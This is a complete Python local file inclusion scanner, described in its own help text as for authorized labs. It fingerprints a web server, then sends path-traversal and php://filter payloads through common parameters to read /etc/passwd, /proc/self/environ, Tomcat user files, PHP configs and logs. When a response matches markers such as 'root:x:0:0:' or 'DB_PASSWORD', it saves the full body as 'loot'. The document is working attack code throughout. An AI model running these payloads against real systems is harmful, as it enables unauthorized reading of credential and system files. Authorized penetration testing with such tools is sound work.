#!/usr/bin/env python3

import argparse
import re
import time
import os
import json
import requests
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse


class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    MAGENTA = "\033[35m"
    DIM = "\033[2m"


def good(msg):
    print(f"{C.GREEN}[+]{C.RESET} {msg}")


def info(msg):
    print(f"{C.CYAN}[*]{C.RESET} {msg}")


def warn(msg):
    print(f"{C.YELLOW}[!]{C.RESET} {msg}")


def bad(msg):
    print(f"{C.RED}[-]{C.RESET} {msg}")


def finding(msg):
    print(f"{C.RED}{C.BOLD}[!!!]{C.RESET} {C.RED}{msg}{C.RESET}")


DEFAULT_PARAMS = [
    "file", "page", "path", "view", "template", "document", "doc",
    "download", "include", "inc", "lang", "content", "module"
]

BASE_LFI_TARGETS = [
    "/etc/passwd",
    "/etc/hosts",
    "/etc/issue",
    "/proc/self/environ",
]

TECH_LFI_TARGETS = {
    "apache": [
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/etc/apache2/apache2.conf",
        "/etc/apache2/sites-enabled/000-default.conf",
        "/var/www/html/index.php",
        "/var/www/html/config.php",
    ],
    "nginx": [
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/etc/nginx/nginx.conf",
        "/etc/nginx/sites-enabled/default",
        "/usr/share/nginx/html/index.html",
    ],
    "tomcat": [
        "/etc/tomcat9/tomcat-users.xml",
        "/usr/share/tomcat9/etc/tomcat-users.xml",
        "/var/lib/tomcat9/conf/tomcat-users.xml",
        "/opt/tomcat/conf/tomcat-users.xml",
        "/etc/default/tomcat9",
        "/var/log/tomcat9/catalina.out",
        "/var/log/tomcat9/localhost_access_log.txt",
        "/usr/share/tomcat9/bin/catalina.sh",
    ],
    "php": [
        "/etc/php/7.4/apache2/php.ini",
        "/etc/php/8.1/apache2/php.ini",
        "/etc/php/8.2/apache2/php.ini",
        "/var/www/html/index.php",
        "/var/www/html/config.php",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
    ],
}

INDICATORS = [
    "root:x:0:0:",
    "daemon:x:",
    "bin:x:",
    "www-data:x:",
    "<tomcat-users",
    "<role rolename=",
    "ServerRoot",
    "DocumentRoot",
    "nginx.conf",
    "[PHP]",
    "DB_PASSWORD",
    "password",
]


def normalize_url(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def build_payloads(target_files):
    payloads = set()

    for target in target_files:
        if target.startswith("php://"):
            payloads.add(target)
            continue

        clean = target.lstrip("/")
        payloads.add(target)

        for depth in range(1, 9):
            payloads.add("../" * depth + clean)
            payloads.add("..%2f" * depth + clean.replace("/", "%2f"))

    return sorted(payloads)


def fingerprint(base_url, timeout):
    findings = set()
    evidence = []

    try:
        r = requests.get(base_url + "/", timeout=timeout, verify=False)
        headers = " ".join(f"{k}: {v}" for k, v in r.headers.items())
        body = r.text[:5000]
        combined = f"{headers}\n{body}".lower()

        if "apache tomcat" in combined or "catalina" in combined:
            findings.add("tomcat")
            evidence.append("Detected Tomcat from headers/body")

        if "apache" in combined and "tomcat" not in combined:
            findings.add("apache")
            evidence.append("Detected Apache from headers/body")

        if "nginx" in combined:
            findings.add("nginx")
            evidence.append("Detected Nginx from headers/body")

        if "php" in combined or re.search(r"\.php", combined):
            findings.add("php")
            evidence.append("Detected PHP hints from headers/body")

    except requests.RequestException as e:
        evidence.append(f"Fingerprint request failed: {e}")

    return findings, evidence


def build_test_url(base_url, path, param, payload):
    target_url = urljoin(base_url + "/", path.lstrip("/"))
    parsed = urlparse(target_url)

    query = parse_qs(parsed.query)
    query[param] = payload

    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        urlencode(query, doseq=True),
        parsed.fragment,
    ))


def test_lfi(base_url, path, param, payload, timeout):
    final_url = build_test_url(base_url, path, param, payload)

    try:
        start = time.time()
        r = requests.get(final_url, timeout=timeout, verify=False)
        elapsed = round(time.time() - start, 2)

        body = r.text

        for indicator in INDICATORS:
            if indicator.lower() in body.lower():
                # Return the full response body.
                # Terminal output is truncated later, but loot/logging can keep everything.
                return True, final_url, r.status_code, indicator, body, elapsed

        return False, final_url, r.status_code, None, None, elapsed

    except requests.exceptions.Timeout:
        return False, final_url, "TIMEOUT", None, None, timeout

    except requests.RequestException as e:
        return False, final_url, f"ERR: {e.__class__.__name__}", None, None, 0


def sanitize_filename(value: str) -> str:
    return re.sub(r"[^a-zA-Z0-9_.-]", "_", value)[:120]


def save_loot(loot_dir, param, payload, tested_url, status, indicator, response_body):
    os.makedirs(loot_dir, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    safe_param = sanitize_filename(param)
    filename = f"{timestamp}_{safe_param}_lfi.txt"
    path = os.path.join(loot_dir, filename)

    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write("=== LFI Finding ===\n")
        f.write(f"Time: {timestamp}\n")
        f.write(f"Param: {param}\n")
        f.write(f"Payload: {payload}\n")
        f.write(f"URL: {tested_url}\n")
        f.write(f"Status: {status}\n")
        f.write(f"Matched: {indicator}\n\n")
        f.write("=== Full Response Body ===\n")
        f.write(response_body or "")

    return path


def append_jsonl_log(log_path, record):
    if not log_path:
        return

    log_dir = os.path.dirname(log_path)
    if log_dir:
        os.makedirs(log_dir, exist_ok=True)

    with open(log_path, "a", encoding="utf-8", errors="ignore") as f:
        f.write(json.dumps(record, ensure_ascii=False) + "\n")


def append_text_log(log_path, text):
    if not log_path:
        return

    log_dir = os.path.dirname(log_path)
    if log_dir:
        os.makedirs(log_dir, exist_ok=True)

    with open(log_path, "a", encoding="utf-8", errors="ignore") as f:
        f.write(text + "\n")


def main():
    parser = argparse.ArgumentParser(
        description="Simple LFI tester with web stack detection for authorized labs"
    )

    parser.add_argument("url")
    parser.add_argument("-p", "--path", default="/")
    parser.add_argument("--params", nargs="+", default=DEFAULT_PARAMS)
    parser.add_argument("--timeout", type=int, default=4)
    parser.add_argument("--show-fingerprints", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--progress-every", type=int, default=25)

    parser.add_argument(
        "--save-loot",
        action="store_true",
        help="Save positive LFI findings to individual files"
    )

    parser.add_argument(
        "--loot-dir",
        default="lfi_loot",
        help="Directory used when --save-loot is enabled"
    )

    parser.add_argument(
        "--log-file",
        default=None,
        help="Write a plain-text scan log to this file"
    )

    parser.add_argument(
        "--jsonl-log",
        default=None,
        help="Write machine-readable JSONL findings/progress to this file"
    )

    args = parser.parse_args()
    requests.packages.urllib3.disable_warnings()

    base_url = normalize_url(args.url)

    scan_started_iso = datetime.now().isoformat(timespec="seconds")
    append_text_log(args.log_file, f"=== LFI Scan Started: {scan_started_iso} ===")
    append_text_log(args.log_file, f"Target: {base_url}")
    append_text_log(args.log_file, f"Path: {args.path}")
    append_jsonl_log(args.jsonl_log, {
        "event": "scan_started",
        "time": scan_started_iso,
        "target": base_url,
        "path": args.path,
        "timeout": args.timeout,
        "params": args.params,
    })

    good(f"Target: {C.BOLD}{base_url}{C.RESET}")
    good(f"Path: {C.BOLD}{args.path}{C.RESET}")
    good(f"Timeout: {args.timeout}s")
    print()

    info("Fingerprinting target...")
    detected, evidence = fingerprint(base_url, args.timeout)

    target_files = list(BASE_LFI_TARGETS)

    for tech in detected:
        target_files.extend(TECH_LFI_TARGETS.get(tech, []))

    target_files = sorted(set(target_files))
    payloads = build_payloads(target_files)

    tech_display = ", ".join(sorted(detected)) if detected else "unknown"
    good(f"Detected tech: {C.MAGENTA}{tech_display}{C.RESET}")
    good(f"LFI target files loaded: {len(target_files)}")
    good(f"Generated payloads: {len(payloads)}")
    good(f"Parameters: {', '.join(args.params)}")
    print()

    append_text_log(args.log_file, f"Detected tech: {tech_display}")
    append_text_log(args.log_file, f"LFI target files loaded: {len(target_files)}")
    append_text_log(args.log_file, f"Generated payloads: {len(payloads)}")
    append_jsonl_log(args.jsonl_log, {
        "event": "fingerprint",
        "time": datetime.now().isoformat(timespec="seconds"),
        "detected": sorted(detected),
        "evidence": evidence,
        "target_files": target_files,
        "payload_count": len(payloads),
    })

    if args.show_fingerprints:
        info("Fingerprint evidence:")
        if evidence:
            for item in evidence:
                print(f"    {C.BLUE}-{C.RESET} {item}")
        else:
            warn("No evidence collected")
        print()

    total_tests = len(args.params) * len(payloads)
    current = 0
    found = False
    started = time.time()

    good(f"Total requests planned: {total_tests}")
    info("Starting LFI tests...")
    print()

    for param in args.params:
        info(f"Testing parameter: {C.BOLD}{param}{C.RESET}")

        for payload in payloads:
            current += 1

            if args.verbose:
                print(f"{C.DIM}[*] [{current}/{total_tests}] Testing {param}={payload[:100]}{C.RESET}")
            elif current == 1 or current % args.progress_every == 0:
                elapsed_total = round(time.time() - started, 1)
                percent = round((current / total_tests) * 100, 1)
                print(
                    f"{C.CYAN}[*]{C.RESET} Progress: "
                    f"{C.BOLD}{current}/{total_tests}{C.RESET} "
                    f"({percent}%) | elapsed {elapsed_total}s"
                )

            vulnerable, tested_url, status, indicator, sample, elapsed = test_lfi(
                base_url,
                args.path,
                param,
                payload,
                args.timeout,
            )

            if args.verbose:
                if status == "TIMEOUT" or str(status).startswith("ERR"):
                    bad(f"Status: {status} | Time: {elapsed}s")
                elif int(status) >= 400:
                    warn(f"Status: {status} | Time: {elapsed}s")
                else:
                    good(f"Status: {status} | Time: {elapsed}s")

            if vulnerable:
                found = True
                print()
                finding("Possible LFI found")
                print(f"      {C.BOLD}Param:{C.RESET} {param}")
                print(f"      {C.BOLD}Payload:{C.RESET} {payload}")
                print(f"      {C.BOLD}URL:{C.RESET} {tested_url}")
                print(f"      {C.BOLD}Status:{C.RESET} {status}")
                print(f"      {C.BOLD}Matched:{C.RESET} {C.YELLOW}{indicator}{C.RESET}")

                terminal_sample = (sample or "")[:800]
                truncated_note = " (truncated to 800 chars)" if sample and len(sample) > 800 else ""
                print(f"      {C.BOLD}Sample{truncated_note}:{C.RESET}")
                print("      " + terminal_sample.replace("\n", "\n      "))

                loot_path = None
                if args.save_loot:
                    loot_path = save_loot(
                        args.loot_dir,
                        param,
                        payload,
                        tested_url,
                        status,
                        indicator,
                        sample,
                    )
                    good(f"Loot saved: {loot_path}")

                append_text_log(args.log_file, "")
                append_text_log(args.log_file, "[!!!] Possible LFI found")
                append_text_log(args.log_file, f"Param: {param}")
                append_text_log(args.log_file, f"Payload: {payload}")
                append_text_log(args.log_file, f"URL: {tested_url}")
                append_text_log(args.log_file, f"Status: {status}")
                append_text_log(args.log_file, f"Matched: {indicator}")
                append_text_log(args.log_file, f"Loot file: {loot_path if loot_path else 'not saved'}")

                append_jsonl_log(args.jsonl_log, {
                    "event": "finding",
                    "time": datetime.now().isoformat(timespec="seconds"),
                    "param": param,
                    "payload": payload,
                    "url": tested_url,
                    "status": status,
                    "indicator": indicator,
                    "response_size": len(sample or ""),
                    "response_body": sample,
                    "loot_file": loot_path,
                })

                print()

    elapsed_total = round(time.time() - started, 2)

    print()
    good("Scan complete")
    good(f"Requests tested: {current}/{total_tests}")
    good(f"Elapsed time: {elapsed_total}s")

    append_text_log(args.log_file, f"Scan complete. Requests tested: {current}/{total_tests}. Elapsed: {elapsed_total}s. Findings: {found}")
    append_jsonl_log(args.jsonl_log, {
        "event": "scan_complete",
        "time": datetime.now().isoformat(timespec="seconds"),
        "requests_tested": current,
        "total_tests": total_tests,
        "elapsed_seconds": elapsed_total,
        "findings": found,
    })

    if args.log_file:
        good(f"Text log saved/appended: {args.log_file}")

    if args.jsonl_log:
        good(f"JSONL log saved/appended: {args.jsonl_log}")

    if not found:
        warn("No obvious LFI detected with current payloads.")


if __name__ == "__main__":
    main()
